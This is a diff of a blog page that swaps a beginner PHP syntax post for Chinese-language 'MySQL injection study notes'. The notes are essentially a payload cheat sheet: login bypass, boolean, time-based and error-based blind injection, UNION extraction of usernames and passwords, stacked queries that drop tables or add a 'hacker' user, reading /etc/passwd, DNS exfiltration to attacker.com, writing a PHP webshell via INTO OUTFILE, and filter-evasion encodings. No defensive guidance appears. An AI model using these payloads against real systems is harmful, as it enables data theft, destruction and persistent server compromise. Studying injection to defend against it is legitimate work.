@@ -77,189 +77,133 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-php" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-mysql注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2026/04/27/php/" class="article-date">
-  <time class="dt-published" datetime="2026-04-26T16:00:00.000Z" itemprop="datePublished">2026-04-27</time>
+    <a href="/2026/04/28/mysql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2026-04-28T15:50:20.122Z" itemprop="datePublished">2026-04-28</time>
 </a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/">技术笔记</a>
-  </div>
-
   </div>
   <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/04/27/php/">php 语法基础</a>
-    </h1>
-  
-
-      </header>
-    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2 id="一、PHP-基础入门"><a href="#一、PHP-基础入门" class="headerlink" title="一、PHP 基础入门"></a>一、PHP 基础入门</h2><h3 id="1-基本语法"><a href="#1-基本语法" class="headerlink" title="1. 基本语法"></a>1. 基本语法</h3><ul>
-<li>PHP 代码以 <code>&lt;?php</code> 开始，<code>?&gt;</code> 结束，可嵌入 HTML 中</li>
-<li>语句必须以<strong>分号 <code>;</code></strong> 结尾</li>
-<li>单行注释：<code>// 注释内容</code></li>
-<li>多行注释：<code>/* 注释内容 */</code></li>
+        <h1 id="MySQL-注入漏洞学习笔记"><a href="#MySQL-注入漏洞学习笔记" class="headerlink" title="MySQL 注入漏洞学习笔记"></a>MySQL 注入漏洞学习笔记</h1><h2 id="📌-1-注入基础"><a href="#📌-1-注入基础" class="headerlink" title="📌 1. 注入基础"></a>📌 1. 注入基础</h2><h3 id="1-1-注入原理"><a href="#1-1-注入原理" class="headerlink" title="1.1 注入原理"></a>1.1 注入原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 原始查询</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$user&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$pass&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注入后</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">-- &#x27; AND password = &#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-常见注入点"><a href="#1-2-常见注入点" class="headerlink" title="1.2 常见注入点"></a>1.2 常见注入点</h3><ul>
+<li>GET&#x2F;POST参数</li>
+<li>HTTP头部</li>
+<li>Cookie参数</li>
+<li>文件上传名</li>
+<li>搜索框</li>
 </ul>
-<p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输出内容</span><br><span class="line">echo &quot;Hello PHP!&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="🔍-2-检测注入"><a href="#🔍-2-检测注入" class="headerlink" title="🔍 2. 检测注入"></a>🔍 2. 检测注入</h2><h3 id="2-1-布尔检测"><a href="#2-1-布尔检测" class="headerlink" title="2.1 布尔检测"></a>2.1 布尔检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 --     # 正常显示</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--     # 异常/无结果</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-输出语句"><a href="#2-输出语句" class="headerlink" title="2. 输出语句"></a>2. 输出语句</h3><ul>
-<li><code>echo</code>：最常用，输出一个或多个字符串，<strong>无返回值</strong></li>
-<li><code>print</code>：输出一个字符串，有返回值（效率低于 echo）</li>
-<li><code>print_r()</code>：打印变量信息（适合数组 &#x2F; 对象）</li>
-<li><code>var_dump()</code>：打印变量类型 + 值（调试专用）</li>
-</ul>
-<h2 id="二、变量与数据类型"><a href="#二、变量与数据类型" class="headerlink" title="二、变量与数据类型"></a>二、变量与数据类型</h2><h3 id="1-变量规则"><a href="#1-变量规则" class="headerlink" title="1. 变量规则"></a>1. 变量规则</h3><ul>
-<li>以 <code>$</code> 符号开头，如 <code>$name</code></li>
-<li>区分大小写，不能以数字开头</li>
-<li>弱类型语言：<strong>无需声明类型</strong>，自动转换</li>
-</ul>
-<h3 id="2-8-种数据类型"><a href="#2-8-种数据类型" class="headerlink" title="2. 8 种数据类型"></a>2. 8 种数据类型</h3><h4 id="标量类型（4-种）"><a href="#标量类型（4-种）" class="headerlink" title="标量类型（4 种）"></a>标量类型（4 种）</h4><ol>
-<li><strong>字符串</strong>：<code>$str = &quot;abc&quot;;</code></li>
-<li><strong>整型</strong>：<code>$num = 100;</code></li>
-<li><strong>浮点型</strong>：<code>$float = 3.14;</code></li>
-<li><strong>布尔型</strong>：<code>$bool = true / false;</code></li>
-</ol>
-<h4 id="复合类型（2-种）"><a href="#复合类型（2-种）" class="headerlink" title="复合类型（2 种）"></a>复合类型（2 种）</h4><ol>
-<li><strong>数组</strong>：<code>$arr = [1,2,3];</code></li>
-<li><strong>对象</strong>：面向对象使用</li>
-</ol>
-<h4 id="特殊类型（2-种）"><a href="#特殊类型（2-种）" class="headerlink" title="特殊类型（2 种）"></a>特殊类型（2 种）</h4><ol>
-<li><strong>NULL</strong>：空值</li>
-<li><strong>资源</strong>：文件、数据库连接等</li>
-</ol>
-<h3 id="3-常量"><a href="#3-常量" class="headerlink" title="3. 常量"></a>3. 常量</h3><ul>
-<li>定义后<strong>不可修改</strong>，全局有效</li>
-</ul>
-<p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(&quot;NAME&quot;, &quot;PHP学习&quot;);</span><br><span class="line">echo NAME;</span><br></pre></td></tr></table></figure>
+<h3 id="2-2-错误检测"><a href="#2-2-错误检测" class="headerlink" title="2.2 错误检测"></a>2.2 错误检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 union select 1,2,3 -- </span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="comment">--     # 判断列数</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="三、运算符"><a href="#三、运算符" class="headerlink" title="三、运算符"></a>三、运算符</h2><h3 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1. 算术运算符"></a>1. 算术运算符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * / % ++ --</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-时间盲注"><a href="#2-3-时间盲注" class="headerlink" title="2.3 时间盲注"></a>2.3 时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND IF(1=1, SLEEP(5), 0) -- </span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> IF(ASCII(SUBSTR(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>, SLEEP(<span class="number">3</span>), <span class="number">0</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-比较运算符"><a href="#2-比较运算符" class="headerlink" title="2. 比较运算符"></a>2. 比较运算符</h3><p><code>== 等于</code>、<code>=== 全等于（值+类型都相同）</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!= &gt; &lt; &gt;= &lt;=</span><br></pre></td></tr></table></figure>
+<h2 id="🎯-3-信息获取"><a href="#🎯-3-信息获取" class="headerlink" title="🎯 3. 信息获取"></a>🎯 3. 信息获取</h2><h3 id="3-1-基础信息"><a href="#3-1-基础信息" class="headerlink" title="3.1 基础信息"></a>3.1 基础信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库版本</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> version()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 当前用户</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>()</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 数据库名</span></span><br><span class="line"><span class="keyword">SELECT</span> database()</span><br></pre></td></tr></table></figure>
 
-<h3 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3. 逻辑运算符"></a>3. 逻辑运算符</h3><p><code>&amp;&amp; 与</code>、<code>|| 或</code>、<code>! 非</code></p>
-<h3 id="4-字符串运算符"><a href="#4-字符串运算符" class="headerlink" title="4. 字符串运算符"></a>4. 字符串运算符</h3><p><code>.</code> 拼接字符串</p>
-<p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Hello&quot; . &quot; PHP&quot;; // 输出 Hello PHP</span><br></pre></td></tr></table></figure>
+<h3 id="3-2-数据库结构"><a href="#3-2-数据库结构" class="headerlink" title="3.2 数据库结构"></a>3.2 数据库结构</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 所有数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">FROM</span> information_schema.schemata</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 当前数据库表</span></span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> database()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 表的列信息</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns</span><br><span class="line"><span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> <span class="keyword">AND</span> table_schema <span class="operator">=</span> database()</span><br></pre></td></tr></table></figure>
 
-<h2 id="四、流程控制"><a href="#四、流程控制" class="headerlink" title="四、流程控制"></a>四、流程控制</h2><h3 id="1-条件判断"><a href="#1-条件判断" class="headerlink" title="1. 条件判断"></a>1. 条件判断</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// if-else</span><br><span class="line">if($score &gt;= 60)&#123;</span><br><span class="line">  echo &quot;及格&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  echo &quot;不及格&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// switch</span><br><span class="line">switch($num)&#123;</span><br><span class="line">  case 1: echo &quot;一&quot;; break;</span><br><span class="line">  default: echo &quot;其他&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="🛠-4-常用函数"><a href="#🛠-4-常用函数" class="headerlink" title="🛠 4. 常用函数"></a>🛠 4. 常用函数</h2><h3 id="4-1-字符串函数"><a href="#4-1-字符串函数" class="headerlink" title="4.1 字符串函数"></a>4.1 字符串函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(str1, str2)      <span class="comment">-- 连接字符串</span></span><br><span class="line">GROUP_CONCAT(col)       <span class="comment">-- 合并多行</span></span><br><span class="line"><span class="built_in">SUBSTRING</span>(str, pos, len) <span class="comment">-- 截取字符串</span></span><br><span class="line">ASCII(<span class="type">char</span>)             <span class="comment">-- 获取ASCII码</span></span><br><span class="line">LENGTH(str)             <span class="comment">-- 字符串长度</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-循环结构"><a href="#2-循环结构" class="headerlink" title="2. 循环结构"></a>2. 循环结构</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// for 循环</span><br><span class="line">for($i=0; $i&lt;5; $i++)&#123; echo $i; &#125;</span><br><span class="line"></span><br><span class="line">// while 循环</span><br><span class="line">$i=0;</span><br><span class="line">while($i&lt;5)&#123; $i++; &#125;</span><br><span class="line"></span><br><span class="line">// foreach（遍历数组专用）</span><br><span class="line">foreach($arr as $val)&#123;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="4-2-系统函数"><a href="#4-2-系统函数" class="headerlink" title="4.2 系统函数"></a>4.2 系统函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD_FILE(<span class="string">&#x27;/etc/passwd&#x27;</span>)  <span class="comment">-- 读取文件</span></span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/1.php&#x27;</span>  <span class="comment">-- 写入文件</span></span><br><span class="line">SLEEP(<span class="number">5</span>)                   <span class="comment">-- 延迟执行</span></span><br><span class="line">BENCHMARK(<span class="number">1000000</span>, MD5(<span class="string">&#x27;test&#x27;</span>)) <span class="comment">-- 负载测试</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="五、数组"><a href="#五、数组" class="headerlink" title="五、数组"></a>五、数组</h2><h3 id="1-数组分类"><a href="#1-数组分类" class="headerlink" title="1. 数组分类"></a>1. 数组分类</h3><ol>
-<li><strong>索引数组</strong>：下标为数字</li>
-</ol>
-<p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$arr = [10, 20, 30];</span><br><span class="line">echo $arr[0]; // 10</span><br></pre></td></tr></table></figure>
+<h2 id="💡-5-高级技巧"><a href="#💡-5-高级技巧" class="headerlink" title="💡 5. 高级技巧"></a>💡 5. 高级技巧</h2><h3 id="5-1-联合查询注入"><a href="#5-1-联合查询注入" class="headerlink" title="5.1 联合查询注入"></a>5.1 联合查询注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT null, username, password FROM users -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 判断列数</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="comment">-- </span></span><br><span class="line"><span class="string">&#x27; ORDER BY 2 -- </span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">10</span> <span class="comment">--   # 错误时说明列数</span></span><br></pre></td></tr></table></figure>
 
-<ol>
-<li><strong>关联数组</strong>：自定义键名</li>
-</ol>
-<p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = [&quot;name&quot;=&gt;&quot;张三&quot;,&quot;age&quot;=&gt;20];</span><br><span class="line">echo $user[&quot;name&quot;];</span><br></pre></td></tr></table></figure>
+<h3 id="5-2-报错注入"><a href="#5-2-报错注入" class="headerlink" title="5.2 报错注入"></a>5.2 报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基于extractvalue</span></span><br><span class="line"><span class="string">&#x27; AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 基于updatexml</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">SELECT</span> <span class="keyword">user</span>()), <span class="number">0x7e</span>), <span class="number">1</span>) <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于几何函数</span></span><br><span class="line"><span class="string">&#x27; AND ST_LatFromGeoHash((SELECT * FROM (SELECT * FROM (SELECT user())a)b)) --</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-常用数组函数"><a href="#2-常用数组函数" class="headerlink" title="2. 常用数组函数"></a>2. 常用数组函数</h3><ul>
-<li><code>count()</code>：获取数组长度</li>
-<li><code>array_push()</code>：尾部添加元素</li>
-<li><code>array_pop()</code>：删除尾部元素</li>
-<li><code>in_array()</code>：判断值是否在数组中</li>
-<li><code>implode()</code>：数组转字符串</li>
-<li><code>explode()</code>：字符串转数组</li>
-</ul>
-<h2 id="六、函数"><a href="#六、函数" class="headerlink" title="六、函数"></a>六、函数</h2><h3 id="1-自定义函数"><a href="#1-自定义函数" class="headerlink" title="1. 自定义函数"></a>1. 自定义函数</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 定义</span><br><span class="line">function add($a, $b)&#123;</span><br><span class="line">  return $a + $b;</span><br><span class="line">&#125;</span><br><span class="line">// 调用</span><br><span class="line">echo add(1,2);</span><br></pre></td></tr></table></figure>
+<h3 id="5-3-盲注技术"><a href="#5-3-盲注技术" class="headerlink" title="5.3 盲注技术"></a>5.3 盲注技术</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 布尔盲注</span></span><br><span class="line"><span class="string">&#x27; AND ASCII(SUBSTRING((SELECT user()),1,1)) &gt; 100 -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 时间盲注</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>, SLEEP(<span class="number">3</span>), <span class="number">0</span>) <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于报错的盲注</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), FLOOR(RAND(0)*2))x </span></span><br><span class="line"><span class="string">FROM information_schema.tables GROUP BY x)a) --</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-常用系统函数"><a href="#2-常用系统函数" class="headerlink" title="2. 常用系统函数"></a>2. 常用系统函数</h3><ul>
-<li>字符串：<code>strlen()</code>、<code>trim()</code>、<code>str_replace()</code></li>
-<li>时间：<code>time()</code>、<code>date(&quot;Y-m-d H:i:s&quot;)</code></li>
-<li>文件：<code>file_get_contents()</code>、<code>file_put_contents()</code></li>
-</ul>
-<h2 id="七、表单与超全局变量"><a href="#七、表单与超全局变量" class="headerlink" title="七、表单与超全局变量"></a>七、表单与超全局变量</h2><h3 id="1-接收表单数据"><a href="#1-接收表单数据" class="headerlink" title="1. 接收表单数据"></a>1. 接收表单数据</h3><ul>
-<li><code>$_GET</code>：接收 GET 方式提交的数据</li>
-<li><code>$_POST</code>：接收 POST 方式提交的数据</li>
-<li><code>$_REQUEST</code>：同时接收 GET&#x2F;POST</li>
-</ul>
-<p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = $_POST[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
+<h3 id="5-4-堆叠查询"><a href="#5-4-堆叠查询" class="headerlink" title="5.4 堆叠查询"></a>5.4 堆叠查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users; <span class="comment">-- </span></span><br><span class="line">; <span class="keyword">INSERT INTO</span> users <span class="keyword">VALUES</span> (<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;password&#x27;</span>); <span class="comment">--</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-其他超全局变量"><a href="#2-其他超全局变量" class="headerlink" title="2. 其他超全局变量"></a>2. 其他超全局变量</h3><ul>
-<li><code>$_SERVER</code>：服务器信息</li>
-<li><code>$_SESSION</code>：会话数据</li>
-<li><code>$_COOKIE</code>：Cookie 数据</li>
-</ul>
-<h2 id="八、会话与-Cookie"><a href="#八、会话与-Cookie" class="headerlink" title="八、会话与 Cookie"></a>八、会话与 Cookie</h2><h3 id="1-Session（服务器存储）"><a href="#1-Session（服务器存储）" class="headerlink" title="1. Session（服务器存储）"></a>1. Session（服务器存储）</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session_start(); // 必须开头</span><br><span class="line">$_SESSION[&quot;user&quot;] = &quot;张三&quot;; // 赋值</span><br><span class="line">unset($_SESSION[&quot;user&quot;]); // 删除</span><br><span class="line">session_destroy(); // 销毁会话</span><br></pre></td></tr></table></figure>
+<h2 id="📁-6-文件操作"><a href="#📁-6-文件操作" class="headerlink" title="📁 6. 文件操作"></a>📁 6. 文件操作</h2><h3 id="6-1-读取文件"><a href="#6-1-读取文件" class="headerlink" title="6.1 读取文件"></a>6.1 读取文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT LOAD_FILE(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;), null, null -- </span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">SELECT</span> <span class="keyword">user</span>()), <span class="string">&#x27;.attacker.com\\&#x27;</span>))) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-Cookie（客户端存储）"><a href="#2-Cookie（客户端存储）" class="headerlink" title="2. Cookie（客户端存储）"></a>2. Cookie（客户端存储）</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;name&quot;,&quot;张三&quot;,time()+3600); // 设置</span><br><span class="line">echo $_COOKIE[&quot;name&quot;]; // 获取</span><br><span class="line">setcookie(&quot;name&quot;,&quot;&quot;,time()-1); // 删除</span><br></pre></td></tr></table></figure>
+<h3 id="6-2-写入文件"><a href="#6-2-写入文件" class="headerlink" title="6.2 写入文件"></a>6.2 写入文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span><span class="operator">&lt;</span>?php <span class="keyword">system</span>($_GET[cmd]); ?<span class="operator">&gt;</span><span class="string">&#x27; INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>shell.php<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="九、MySQL-数据库操作（MySQLi）"><a href="#九、MySQL-数据库操作（MySQLi）" class="headerlink" title="九、MySQL 数据库操作（MySQLi）"></a>九、MySQL 数据库操作（MySQLi）</h2><h3 id="1-连接数据库"><a href="#1-连接数据库" class="headerlink" title="1. 连接数据库"></a>1. 连接数据库</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;密码&quot;,&quot;库名&quot;);</span><br></pre></td></tr></table></figure>
+<h2 id="🚫-7-绕过技巧"><a href="#🚫-7-绕过技巧" class="headerlink" title="🚫 7. 绕过技巧"></a>🚫 7. 绕过技巧</h2><h3 id="7-1-编码绕过"><a href="#7-1-编码绕过" class="headerlink" title="7.1 编码绕过"></a>7.1 编码绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- URL编码</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">4</span>f<span class="operator">%</span><span class="number">52</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 十六进制</span></span><br><span class="line"><span class="number">0x61646d696e</span>   <span class="comment">-- admin</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0x61646d696e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符编码</span></span><br><span class="line"><span class="type">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)  <span class="comment">-- admin</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-执行-SQL"><a href="#2-执行-SQL" class="headerlink" title="2. 执行 SQL"></a>2. 执行 SQL</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 查询</span><br><span class="line">$sql = &quot;SELECT * FROM user&quot;;</span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line">while($row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">  print_r($row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 增删改</span><br><span class="line">$sql = &quot;INSERT INTO user(name) VALUES(&#x27;张三&#x27;)&quot;;</span><br><span class="line">mysqli_query($conn, $sql);</span><br></pre></td></tr></table></figure>
